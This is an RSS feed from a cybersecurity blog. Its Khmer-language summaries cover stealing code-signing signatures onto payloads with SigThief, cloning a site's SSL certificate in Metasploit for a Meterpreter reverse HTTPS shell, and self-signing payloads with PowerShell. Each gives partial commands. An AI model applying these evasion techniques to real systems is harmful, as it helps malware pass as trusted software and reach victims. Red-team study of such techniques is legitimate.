<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>CA on ThikLab - CyberSec</title>
    <link>https://th1k.github.io/en/categories/ca/</link>
    <description>Recent content in CA on ThikLab - CyberSec</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <managingEditor>leangputthik@protonmail.com (Thik)</managingEditor>
    <webMaster>leangputthik@protonmail.com (Thik)</webMaster>
    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2025 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
    <lastBuildDate>Sat, 08 Jul 2023 16:22:34 +0700</lastBuildDate>
    
        <atom:link href="https://th1k.github.io/en/categories/ca/index.xml" rel="self" type="application/rss+xml" />
    

      
      <item>
        <title>Hijacking Digital Signatures</title>
        <link>https://th1k.github.io/en/posts/hijacking-digital-signatures/</link>
        <pubDate>Sat, 08 Jul 2023 16:22:34 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Sat, 08 Jul 2023 16:22:34 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/hijacking-digital-signatures/</guid>
        <description>មានវិធីសាស្ត្រជាច្រើនក្នុងការលួចយក ឬ ចម្លងយក Digital Signatures ចេញពីឯកសារពិតប្រាកដណាមួយនៅក្នុងប្រព័ន្ធវីនដូ ។ តែថ្ងៃនេះយើងនឹងមកមើលឧបករណ៍មួយដែលអាចជួយឲ្យមានភាពងាយស្រួលក្នុងការលួចយក Signatures ដែលមាននៅក្នុងឯកសារ Binary រួចដាក់បញ្ជូលទៅក្នុង Payload បានយ៉ាងឆាប់រហ័ស ។
Digital Signatures Hijacking Tools SigThif ងាយៗជាមួយ SigThif ក្នុងការលួចយក Signatures ពីកម្មវិធីជាច្រើននៅក្នងវីនដូ ។
វិធីប្រើ 1 2 3 4 5 6 7 8 9 10 11 12 13 14  git clone https://github.com/secretsquirrel/SigThief.git cd SigThief // លួចយក Signature ចេញពីកម្មវិធីរួចដាក់ចូលទៅក្នុង Payload python3 sigthief.py -i putty.exe -t payload.exe -o malsign.exe // យក Signature ចេញ និងរក្សាទុកប្រើពេលក្រោយ python3 sigthief.py -i putty.exe -r // យក Signature ដែលរក្សាទុកមកប្រើប្រាស់វិញ python3 sigthief.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature3/ca.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>hijacking</category>
            
          
            
              <category>digiral-signatures</category>
            
          
        
        
          
            
              <category>CA</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Impersonate SSL - MSF Bypass Detection</title>
        <link>https://th1k.github.io/en/posts/bypass-detection-msf-shell/</link>
        <pubDate>Sat, 03 Dec 2022 21:01:06 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Sat, 03 Dec 2022 21:01:06 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/bypass-detection-msf-shell/</guid>
        <description>Clone SSL Certification តើអ្នកដឹងទេថា យើងអាចធ្វើការថតចម្លងនូវរាល់ឯកសារ SSL Certificate របស់គេហទំព័រដទៃបាន ដោយប្រើប្រាស់ Module មួយនៅក្នុង Metasploit Framework ដែលត្រូវបានបង្កើតឡើងដោយលោក Chris John Riley ។ ឯកសារដែលត្រូវបានថតចម្លងនោះ នឹងត្រូវរក្សាទុកជាប្រភេទទម្រង់ឯកសារ PEM ហើយវាក៏អាចប្រើប្រាស់បានគ្រប់ប្រភេទ Modules នៅក្នុង Metasploit ផងដែរ។
ដើម្បីថតចម្លង យើងអាចប្រើប្រាស់ពាក្យបញ្ជាដូចខាងក្រោម៖
1 2 3  use auxiliary/gather/impersonate_ssl set rhosts https://example.com/ exploit   ដូចដែលរូបបានបង្ហាញខាងលើ គឺយើងបានថតចម្លងឯកសារ Certificate បានសម្រេច។
Meterpreter Using SSL Connection ខាងក្រោមនេះគឺជាការសាកល្បងប្រើប្រាស់ SSL Certificate ដែលបានថតចម្លងនោះមកភ្ជាប់ទំនាក់ទំងរវាង Attacker PC និង Victim PC ដោយប្រើប្រាស់ Reverse Shell ជាប្រភេទ HTTPS ។
បើកចូលផ្ទាំង Terminal នៃ Metasploit Framework រួចបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖
1 2 3 4 5 6 7  use exploit/multi/handler set payload windows/x64/meterpreter/reverse_https set lhost 192.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>metasploit</category>
            
          
            
              <category>ssl</category>
            
          
            
              <category>bypass</category>
            
          
        
        
          
            
              <category>CA</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Self Signed Certification</title>
        <link>https://th1k.github.io/en/posts/self-signed-certification/</link>
        <pubDate>Tue, 02 Jun 2020 16:22:34 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Tue, 02 Jun 2020 16:22:34 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/self-signed-certification/</guid>
        <description>តើមានវិធីអ្វីដែលអាចធ្វើ Code Signing ទៅលើ Payload ដែលយើងបានបង្កើតឡើងដោយខ្លួនឯងរួច?
ខាងក្រោមនេះគឺជាវិធីដ៏ល្អមួយសម្រាប់ចម្លើយនៃសំនួរខាងលើ៖
Generate the Key 1 2  # Make sure you run as Administrator New-SelfSignedCertificate -DnsName email@yourdomain.com -Type CodeSigning -CertStoreLocation cert:\CurrentUser\My   Export Certification Without Private Key 1  Export-Certificate -Cert (Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert)[0] -FilePath code_signing.crt   ចំពោះលេខ [0] គឺសម្រាប់ករណីនៅពេលដែលយើងមាន Certificate ច្រើនជាងមួយ។
Import as Trusted Publisher 1  Import-Certificate -FilePath .\code_signing.crt -Cert Cert:\CurrentUser\TrustedPublisher   Import as Root Certificate Authority 1  Import-Certificate -FilePath .</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature3/ca.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>code-signing</category>
            
          
        
        
          
            
              <category>CA</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      

    
  </channel>
</rss>
